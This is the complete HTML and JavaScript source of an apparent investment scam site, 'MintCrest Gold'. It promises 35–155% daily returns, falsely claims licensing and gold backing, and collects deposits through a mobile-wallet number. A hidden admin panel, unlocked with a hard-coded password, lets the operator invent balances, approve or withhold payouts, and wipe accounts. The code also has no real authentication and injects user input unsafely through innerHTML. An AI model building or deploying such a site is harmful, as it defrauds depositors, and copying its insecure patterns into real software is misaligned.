<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Institutional Custody</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000205; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: fadeIn 0.5s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
        .badge-pending { @apply bg-yellow-500/10 text-yellow-500 px-2 py-1 rounded text-[7px] font-bold; }
        .badge-approved { @apply bg-green-500/10 text-green-400 px-2 py-1 rounded text-[7px] font-bold; }
        .badge-rejected { @apply bg-red-500/10 text-red-500 px-2 py-1 rounded text-[7px] font-bold; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div class="bg-blue-600 py-1 text-center text-[7px] font-black tracking-[0.3em] uppercase">🔐 Secure Digital Asset Vault v12.5</div>

    <section id="auth-ui" class="h-full flex items-center justify-center p-6 z-[1000] absolute inset-0 bg-[#000205]">
        <div class="glass w-full max-w-sm p-12 rounded-[3.5rem] text-center border-t-4 border-blue-600">
            <h1 onclick="adminTap()" class="text-4xl font-black italic tracking-tighter mb-2 cursor-pointer">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12">Premier Gold Liquidity</p>
            <input type="text" id="user-name" placeholder="Legal Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-4 focus:border-blue-500">
            <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest">Access Vault</button>
        </div>
    </section>

    <div id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 relative">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Capital Balance</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold border border-green-500/20 uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase italic">Verified Acc</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="changePage('wallet')" class="glass p-7 rounded-[2.5rem] text-center border-b-2 border-blue-600 active:scale-95 transition">📥 <span class="text-[9px] font-black block mt-2 uppercase">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-7 rounded-[2.5rem] text-center border-b-2 border-red-600 active:scale-95 transition">📤 <span class="text-[9px] font-black block mt-2 uppercase">Payout</span></button>
            </div>
            <div class="glass p-6 rounded-[2.5rem] text-center"><p class="text-[8px] opacity-40 uppercase font-bold tracking-[0.2em]">Next Auto-Profit Request in 24h</p></div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-500 text-xl">Asset Tiers</h2>
            <div id="plans-list" class="space-y-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6"><h2 class="text-center font-black italic mb-8 uppercase text-blue-400">Activity Ledger</h2><div id="user-history" class="space-y-2 pb-10"></div></div>

        <div id="p-more" class="page p-6 space-y-4">
            <div class="glass p-8 rounded-[2.5rem] text-center">
                <p class="text-[8px] font-bold text-gray-500 mb-4 uppercase">Referral Network ID</p>
                <input type="text" id="ref-link" readonly class="w-full bg-white/5 p-4 rounded-2xl text-[10px] text-center font-bold mb-4">
                <button onclick="copyRef()" class="bg-blue-600 px-10 py-3 rounded-2xl font-black text-[9px] uppercase">Copy Link</button>
            </div>
            <div class="glass p-6 rounded-[2.5rem]"><h3 class="font-black text-[10px] text-blue-500 mb-3 uppercase italic">Institutional Profile</h3><p class="text-[9px] leading-relaxed opacity-60">MintCrest Gold Enterprise is a licensed commodity trading firm. All assets are backed by 1:1 physical gold reserves.</p></div>
            <a href="mailto:webhub262@gmail.com" class="block w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-blue-400 uppercase">Support Contact</a>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] text-center border-t-8 border-blue-600">
                <h3 class="font-black text-blue-500 mb-8 uppercase">Secure Funding</h3>
                <div class="space-y-3 mb-10">
                    <div class="glass p-5 rounded-2xl flex justify-between items-center text-[10px] font-black text-red-500"><span>JAZZCASH</span><span>03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between items-center text-[10px] font-black text-green-500"><span>EASYPAISA</span><span>03705519562</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 mb-3 text-center font-bold">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 mb-8 text-center font-bold">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[10px] uppercase">Verify Transfer</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600">
                <h3 class="font-black text-red-500 mb-8 text-center uppercase">Liquidation</h3>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 mb-3 text-center font-bold">
                <input type="text" id="wd-acc" placeholder="Account Number & Title" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 mb-8 text-center font-bold text-[9px]">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[10px] uppercase">Confirm Payout</button>
            </div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#000205] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h2 class="text-xl font-black text-blue-500 uppercase">System Root</h2><button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-6 py-2 rounded-xl text-[10px] font-black">LOCK</button></div>
        <div class="grid grid-cols-2 gap-4 mb-8">
            <button onclick="showAdminSection('requests')" class="glass p-5 rounded-2xl font-bold text-[10px] uppercase">Orders & Profit</button>
            <button onclick="showAdminSection('users')" class="glass p-5 rounded-2xl font-bold text-[10px] uppercase">User Base</button>
        </div>
        <div id="adm-sec-requests" class="adm-sec space-y-3 mb-12"></div>
        <div id="adm-sec-users" class="adm-sec hidden space-y-3 mb-12"></div>
        <div class="glass p-8 rounded-[3rem]">
            <input type="text" id="adm-user" placeholder="User Name" class="w-full bg-white/5 p-5 rounded-2xl mb-2 text-center text-sm font-bold border border-white/10 outline-none">
            <input type="number" id="adm-val" placeholder="Value (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-6 text-center font-bold border border-white/10 outline-none">
            <div class="grid grid-cols-2 gap-3 mb-6"><button onclick="manualEdit('balance')" class="bg-blue-600 py-4 rounded-2xl font-black text-[9px] uppercase">Add Balance</button><button onclick="manualEdit('profit')" class="bg-green-600 py-4 rounded-2xl font-black text-[9px] uppercase">Add Profit</button></div>
            <button onclick="deleteUser()" class="w-full bg-red-600/10 text-red-500 py-4 rounded-2xl font-black text-[9px] uppercase">Terminate Access</button>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-6 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[3.5rem]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab">🏠<span class="text-[8px] font-extrabold uppercase mt-1">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2">📈<span class="text-[8px] font-extrabold uppercase mt-1">Fleet</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2">📜<span class="text-[8px] font-extrabold uppercase mt-1">Log</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2">🛡️<span class="text-[8px] font-extrabold uppercase mt-1">Legal</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;
        const plans = Array.from({length: 25}, (_, i) => ({ n: `Asset Tier ${i+1}`, p: (i+1)*500, r: 35 + (i*5) }));

        window.onload = () => { const saved = localStorage.getItem('mintcrest_user'); if(saved) { document.getElementById('user-name').value = saved; login(); } };
        function adminTap() { tapCount++; if(tapCount >= 3) { tapCount = 0; if(prompt("Secure Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } } setTimeout(() => tapCount = 0, 2000); }

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mintcrest_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now() });
            startSync(name); document.getElementById('auth-ui').style.display = 'none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); document.getElementById('ref-link').value = window.location.origin + "/?ref=" + name;
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { 
                if(doc.exists) { 
                    user = doc.data(); 
                    document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); 
                    document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString();
                    checkProfitRequirement(user); // Automatic Request Logic
                } 
            });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = snap.empty ? '<p class="text-center opacity-20 py-20 text-[10px] font-black">NO ACTIVITY</p>' : '';
                let items = []; snap.forEach(doc => items.push(doc.data()));
                items.sort((a,b) => b.time - a.time);
                items.forEach(d => {
                    list.innerHTML += `<div class="glass p-6 rounded-3xl flex justify-between items-center border-l-4 ${d.type==='deposit'?'border-blue-500':(d.type==='Daily Profit'?'border-green-500':'border-red-500')} mb-2 text-[10px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px] font-medium">${new Date(d.time).toLocaleString()}</span></div><div class="text-right">₨ ${d.amount.toLocaleString()}<br><span class="badge-${d.status}">${d.status}</span></div></div>`;
                });
            });
        }

        async function checkProfitRequirement(userData) {
            const hours24 = 24 * 60 * 60 * 1000;
            const now = Date.now();
            const lastReq = userData.lastReqTime || userData.time;
            if (userData.activeTier > 0 && (now - lastReq) >= hours24) {
                const dailyProfit = (userData.activeTier * userData.tierROI) / 100;
                await db.collection("requests").add({
                    user: userData.name, amount: dailyProfit, type: "Daily Profit", status: "pending", time: now
                });
                await db.collection("users").doc(userData.name).update({ lastReqTime: now });
                alert("System Alert: Your daily profit request has been sent to Admin!");
            }
        }

        function renderPlans() { 
            const list = document.getElementById('plans-list'); list.innerHTML = ''; 
            plans.forEach(p => { 
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r})" class="glass p-6 rounded-[2.5rem] flex justify-between items-center active:scale-95 mb-2 cursor-pointer border-b border-white/5"><div><h4 class="font-black text-[10px] uppercase text-blue-400">${p.n}</h4><p class="text-[9px] text-green-400 font-bold uppercase">Profit: ${p.r}% Daily</p></div><p class="font-black text-sm">₨ ${p.p.toLocaleString()}</p></div>`; 
            }); 
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        
        async function submitDeposit() { const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; if(!a||!t) return alert("All fields mandatory."); await db.collection("requests").add({user:user.name, amount:parseInt(a), tid:t, type:"deposit", status:"pending", time:Date.now()}); alert("Funding logged! Admin will verify soon."); changePage('activity'); }
        
        async function submitWithdraw() { const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a||!acc||a>user.balance) return alert("Liquidity Error."); await db.collection("requests").add({user:user.name, amount:parseInt(a), acc:acc, type:"withdraw", status:"pending", time:Date.now()}); await db.collection("users").doc(user.name).update({balance:user.balance-parseInt(a)}); alert("Payout request dispatched."); changePage('activity'); }
        
        async function buy(p, roi) { 
            if(user.balance < p) { alert("Insufficient Portfolio."); changePage('wallet'); } 
            else { 
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, lastReqTime: Date.now() }); 
                await db.collection("requests").add({ user: user.name, amount: p, type: "Tier Purchase", status: "approved", time: Date.now() });
                alert("Success: Asset Portfolio Activated!"); changePage('activity');
            } 
        }

        function copyRef() { const c = document.getElementById('ref-link'); c.select(); document.execCommand('copy'); alert("Link Copied."); }

        function showAdminSection(s) { document.querySelectorAll('.adm-sec').forEach(sec=>sec.classList.add('hidden')); document.getElementById('adm-sec-'+s).classList.remove('hidden'); }
        
        function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = snap.empty ? '<p class="text-center opacity-30 py-10 text-[10px]">NO PENDING TASKS</p>' : '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-5 rounded-2xl flex justify-between items-center border-l-4 ${d.type==='deposit'?'border-blue-500':(d.type==='Daily Profit'?'border-green-500':'border-red-500')} mb-2 text-[9px] uppercase font-black"><div class="text-left">${d.user}<br>₨ ${d.amount}<br><span class="opacity-50">${d.type} - ${d.tid || d.acc || 'Auto'}</span></div><div class="flex gap-2"><button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, 'approved', '${d.type}')" class="bg-green-600 px-5 py-2 rounded-xl text-white font-black">OK</button><button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, 'rejected', '${d.type}')" class="bg-red-600 px-5 py-2 rounded-xl text-white font-black">X</button></div></div>`; });
            });
            db.collection("users").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-users'); list.innerHTML = '';
                snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-5 rounded-xl flex justify-between items-center text-[9px] uppercase font-black"><div>${u.name}</div><div class="text-right text-blue-400">BAL: ${u.balance}<br><span class="text-green-400">PRF: ${u.profit}</span></div></div>`; });
            });
        }

        async function handleReq(id, target, amt, action, type) {
            const ref = db.collection("users").doc(target);
            const d = await ref.get();
            if(action === 'approved') {
                if(type === 'deposit') await ref.update({ balance: (d.data().balance || 0) + amt });
                if(type === 'Daily Profit') await ref.update({ profit: (d.data().profit || 0) + amt, balance: (d.data().balance || 0) + amt });
            } else if(action === 'rejected' && type === 'withdraw') {
                await ref.update({ balance: (d.data().balance || 0) + amt });
            }
            await db.collection("requests").doc(id).update({ status: action });
        }

        async function manualEdit(f) { const u = document.getElementById('adm-user').value.trim(); const v = document.getElementById('adm-val').value; if(!u||!v) return alert("Data missing."); const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) { await ref.update({ [f]: (d.data()[f] || 0) + parseInt(v) }); alert("Adjusted."); } }
        async function deleteUser() { const u = document.getElementById('adm-user').value.trim(); if(!u||!confirm("Wipe account?")) return; await db.collection("users").doc(u).delete(); alert("Wiped."); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
    </script>
</body>
</html>
